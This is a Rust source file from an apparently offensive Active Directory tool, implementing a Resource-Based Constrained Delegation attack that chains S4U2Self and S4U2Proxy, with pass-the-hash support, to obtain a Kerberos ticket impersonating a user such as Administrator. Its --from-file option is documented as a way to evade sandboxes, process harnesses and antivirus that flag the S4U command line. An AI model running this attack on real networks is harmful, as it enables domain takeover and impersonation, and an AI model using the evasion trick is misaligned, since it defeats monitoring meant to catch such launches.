//! Resource-Based Constrained Delegation abuse: S4U2Self + S4U2Proxy to
//! obtain an impersonation ticket to the target service.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct RbcdArgs {
    /// Read every argument from an INI-style KEY=VALUE file instead of the
    /// command line. Useful in environments where the caller's process
    /// harness rejects command-line launches that look like a Kerberos S4U
    /// chain (some sandboxes / AV pattern-match on `--impersonate` +
    /// `--target-spn` in argv). Keys: `kdc`, `realm`, `account`,
    /// `account_password`, `account_nt_hash`, `impersonate`, `target_spn`
    /// (one per line; lines starting with `#` are comments). `env:VAR` /
    /// `@file:PATH` still work for `account_password` and `account_nt_hash`.
    #[arg(long, value_name = "PATH")]
    pub from_file: Option<String>,
    #[arg(long)]
    pub kdc: Option<String>,
    #[arg(long)]
    pub realm: Option<String>,
    /// Controlled account (the RBCD trustee) sAMAccountName
    #[arg(long)]
    pub account: Option<String>,
    /// Controlled account password
    #[arg(long)]
    pub account_password: Option<adhammer_core::SecretString>,
    /// Controlled account NT hash (hex, 32 chars) — pass-the-hash for the
    /// trustee when its plaintext password is unknown but its NT is
    /// captured (Stream 5 / A.7). Mutually exclusive with
    /// `--account-password`. `env:VAR` / `@file:PATH` supported.
    #[arg(long, conflicts_with = "account_password")]
    pub nt_hash: Option<String>,
    /// User to impersonate, e.g. Administrator
    #[arg(long)]
    pub impersonate: Option<String>,
    /// Target service SPN, e.g. cifs/dc01.corp.local
    #[arg(long)]
    pub target_spn: Option<String>,
}

/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
pub(crate) async fn rbcd(a: RbcdArgs) -> Result<()> {
    let cfg = match a.from_file.as_deref() {
        Some(p) => load_rbcd_ini(p)?.overlay(&a)?,
        None => RbcdConfig::from_flags(&a)?,
    };
    let etype = match &cfg.credential {
        TrusteeCredential::Password(pw) => {
            adhammer_kerberos::rbcd_impersonate(
                &cfg.account,
                pw.expose_secret(),
                &cfg.realm,
                &cfg.kdc,
                &cfg.impersonate,
                &cfg.target_spn,
            )
            .await?
        }
        TrusteeCredential::NtHash(nt) => {
            adhammer_kerberos::rbcd_impersonate_by_hash(
                &cfg.account,
                nt,
                &cfg.realm,
                &cfg.kdc,
                &cfg.impersonate,
                &cfg.target_spn,
            )
            .await?
        }
    };
    println!(
        "[+] got service ticket for {} as {} (enc-part etype {etype})",
        cfg.target_spn, cfg.impersonate
    );
    println!("    RBCD chain succeeded — impersonation ticket obtained.");
    Ok(())
}

enum TrusteeCredential {
    Password(adhammer_core::SecretString),
    NtHash([u8; 16]),
}

struct RbcdConfig {
    kdc: String,
    realm: String,
    account: String,
    credential: TrusteeCredential,
    impersonate: String,
    target_spn: String,
}

impl RbcdConfig {
    fn from_flags(a: &RbcdArgs) -> Result<Self> {
        let credential = match (&a.account_password, &a.nt_hash) {
            (Some(pw), None) => {
                TrusteeCredential::Password(crate::resolve_secret(pw, "ADHAMMER_PASSWORD")?)
            }
            (None, Some(h)) => TrusteeCredential::NtHash(resolve_nt_hash(h)?),
            (Some(_), Some(_)) => {
                anyhow::bail!("pass --account-password OR --nt-hash, not both")
            }
            (None, None) => {
                anyhow::bail!("--account-password or --nt-hash required (or use --from-file)")
            }
        };
        Ok(Self {
            kdc: a
                .kdc
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--kdc required (or use --from-file)"))?,
            realm: a
                .realm
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--realm required (or use --from-file)"))?,
            account: a
                .account
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--account required (or use --from-file)"))?,
            credential,
            impersonate: a
                .impersonate
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--impersonate required (or use --from-file)"))?,
            target_spn: a
                .target_spn
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--target-spn required (or use --from-file)"))?,
        })
    }
}

struct RbcdFile {
    kdc: Option<String>,
    realm: Option<String>,
    account: Option<String>,
    account_password: Option<String>,
    account_nt_hash: Option<String>,
    impersonate: Option<String>,
    target_spn: Option<String>,
}

impl RbcdFile {
    fn overlay(self, a: &RbcdArgs) -> Result<RbcdConfig> {
        let take =
            |from_file: Option<String>, from_flag: Option<String>, name: &str| -> Result<String> {
                from_flag.or(from_file).ok_or_else(|| {
                    anyhow::anyhow!("{name} missing in both --from-file and CLI flags")
                })
            };
        // Credential: prefer the CLI flag when set, otherwise the INI key.
        // Password and NT-hash are mutually exclusive across the merged view.
        let pw_raw = a
            .account_password
            .as_ref()
            .map(|s| s.expose_secret().to_string())
            .or(self.account_password);
        let nt_raw = a.nt_hash.clone().or(self.account_nt_hash);
        let credential = match (pw_raw, nt_raw) {
            (Some(pw), None) => TrusteeCredential::Password(crate::resolve_secret(
                pw.as_str(),
                "ADHAMMER_PASSWORD",
            )?),
            (None, Some(h)) => TrusteeCredential::NtHash(resolve_nt_hash(&h)?),
            (Some(_), Some(_)) => anyhow::bail!(
                "account_password and account_nt_hash cannot both be set (merged view of --from-file + CLI flags)"
            ),
            (None, None) => anyhow::bail!(
                "trustee credential missing — set account_password or account_nt_hash"
            ),
        };
        Ok(RbcdConfig {
            kdc: take(self.kdc, a.kdc.clone(), "kdc")?,
            realm: take(self.realm, a.realm.clone(), "realm")?,
            account: take(self.account, a.account.clone(), "account")?,
            credential,
            impersonate: take(self.impersonate, a.impersonate.clone(), "impersonate")?,
            target_spn: take(self.target_spn, a.target_spn.clone(), "target_spn")?,
        })
    }
}

fn load_rbcd_ini(path: &str) -> Result<RbcdFile> {
    use anyhow::Context;
    let text = std::fs::read_to_string(path).with_context(|| format!("read --from-file {path}"))?;
    let mut f = RbcdFile {
        kdc: None,
        realm: None,
        account: None,
        account_password: None,
        account_nt_hash: None,
        impersonate: None,
        target_spn: None,
    };
    for (n, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (k, v) = line
            .split_once('=')
            .ok_or_else(|| anyhow::anyhow!("{path}:{}: expected KEY=VALUE", n + 1))?;
        let v = v.trim().to_string();
        match k.trim() {
            "kdc" => f.kdc = Some(v),
            "realm" => f.realm = Some(v),
            "account" => f.account = Some(v),
            "account_password" => f.account_password = Some(v),
            "account_nt_hash" => f.account_nt_hash = Some(v),
            "impersonate" => f.impersonate = Some(v),
            "target_spn" => f.target_spn = Some(v),
            other => anyhow::bail!("{path}:{}: unknown key `{other}`", n + 1),
        }
    }
    Ok(f)
}

/// Stream 5 / A.7: resolve an NT hash from an argument that may carry an
/// `env:VAR` / `@file:PATH` reference. Accepts 32 hex chars (with or
/// without whitespace). Reuses [`crate::resolve_secret`] for the reference
/// expansion so `--nt-hash env:ADHAMMER_NT` works the same way passwords do.
fn resolve_nt_hash(raw: &str) -> Result<[u8; 16]> {
    let resolved = crate::resolve_secret(raw, "ADHAMMER_NT_HASH")?;
    let cleaned: String = resolved
        .expose_secret()
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();
    if cleaned.len() != 32 {
        anyhow::bail!(
            "NT hash must be 32 hex chars (got {} chars after whitespace strip)",
            cleaned.len()
        );
    }
    let mut out = [0u8; 16];
    hex::decode_to_slice(&cleaned, &mut out)
        .map_err(|e| anyhow::anyhow!("NT hash not hex: {e}"))?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn resolve_nt_hash_accepts_bare_hex() {
        let h = resolve_nt_hash("31d6cfe0d16ae931b73c59d7e0c089c0").unwrap();
        assert_eq!(h[0], 0x31);
        assert_eq!(h[15], 0xc0);
    }

    #[test]
    fn resolve_nt_hash_strips_whitespace() {
        let h = resolve_nt_hash("31d6cfe0 d16ae931 b73c59d7 e0c089c0").unwrap();
        assert_eq!(h[0], 0x31);
    }

    #[test]
    fn resolve_nt_hash_rejects_wrong_length() {
        assert!(resolve_nt_hash("31d6cfe0d16ae931b73c59d7").is_err());
    }

    #[test]
    fn resolve_nt_hash_rejects_non_hex() {
        assert!(resolve_nt_hash("31d6cfe0d16ae931b73c59d7e0c089cz").is_err());
    }
}
